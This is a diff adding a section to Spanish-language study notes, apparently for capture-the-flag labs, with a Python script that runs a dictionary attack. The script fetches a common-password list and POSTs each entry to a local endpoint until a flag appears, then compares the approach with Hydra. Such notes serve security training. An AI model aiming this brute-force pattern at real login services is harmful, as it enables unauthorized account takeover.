@@ -30,6 +30,36 @@ for pin in range(10000):
 
 Lógica: itera todos los PIN posibles, envía la petición GET con cada uno, y comprueba el código de estado (200) junto al contenido de la respuesta para detectar el acierto.
 
+### Caso: ataque de diccionario vía HTTP (POST)
+
+Escenario típico: un endpoint `POST /dictionary` que acepta una contraseña en el cuerpo del formulario y responde con éxito y flag/token si coincide.
+
+```python
+import requests
+
+ip = "127.0.0.1"
+port = 1234
+
+# Descarga una wordlist directamente desde SecLists
+passwords = requests.get(
+    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"
+).text.splitlines()
+
+for password in passwords:
+    print(f"Attempted password: {password}")
+
+    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
+
+    if response.ok and 'flag' in response.json():
+        print(f"Correct password found: {password}")
+        print(f"Flag: {response.json()['flag']}")
+        break
+```
+
+Lógica: descarga la wordlist en memoria (sin guardar archivo local), itera cada contraseña, envía POST con `password` como dato de formulario, y comprueba en la respuesta JSON si hay `flag`.
+
+Ventaja de este patrón sobre Hydra en este caso: control total sobre el formato de la petición (JSON, form-data, headers custom) y de la condición de éxito (no solo código HTTP, también contenido de la respuesta).
+
 ### Cuándo escribir un script en vez de usar Hydra
 
 | Situación                                                                                        | Recomendación                               |
